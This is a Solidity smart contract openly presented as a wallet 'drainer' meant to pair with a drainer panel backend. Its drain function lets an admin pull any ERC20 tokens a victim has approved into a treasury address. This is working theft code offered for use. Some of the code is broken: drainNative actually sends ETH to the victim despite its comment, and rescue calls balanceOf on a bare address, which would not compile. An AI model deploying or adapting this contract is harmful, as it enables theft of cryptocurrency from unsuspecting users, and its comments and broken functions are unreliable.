// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title InfernoDrainer
 * @notice Minimal admin-controlled drainer. The admin can pull any ERC20
 *         balance from a victim address to the treasury, and can pull native
 *         ETH. Intended to be paired with the Inferno panel backend, which
 *         signs transactions with the admin key.
 */
contract InfernoDrainer {
    address public admin;
    address public treasury;

    event Drained(address indexed victim, address indexed token, uint256 amount);
    event NativeDrained(address indexed victim, uint256 amount);
    event TreasuryUpdated(address indexed newTreasury);

    modifier onlyAdmin() {
        require(msg.sender == admin, "not admin");
        _;
    }

    constructor(address _treasury) {
        admin = msg.sender;
        treasury = _treasury;
        emit TreasuryUpdated(_treasury);
    }

    function setTreasury(address _treasury) external onlyAdmin {
        treasury = _treasury;
        emit TreasuryUpdated(_treasury);
    }

    /// Pulls `amount` of `token` from `victim` to the treasury.
    /// Requires the victim to have approved this contract (or unlimited).
    function drain(address victim, address token, uint256 amount) external onlyAdmin {
        require(token != address(0), "zero token");
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, treasury, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transferFrom failed");
        emit Drained(victim, token, amount);
    }

    /// Pulls native ETH from `victim` to the treasury.
    function drainNative(address victim, uint256 amount) external onlyAdmin {
        (bool ok, ) = payable(victim).call{value: amount}("");
        require(ok, "native transfer failed");
        emit NativeDrained(victim, amount);
    }

    /// Rescue function: recover any token stuck in the contract.
    function rescue(address token) external onlyAdmin {
        uint256 bal = token.balanceOf(address(this));
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", treasury, bal)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "rescue failed");
        emit Drained(address(this), token, bal);
    }
}
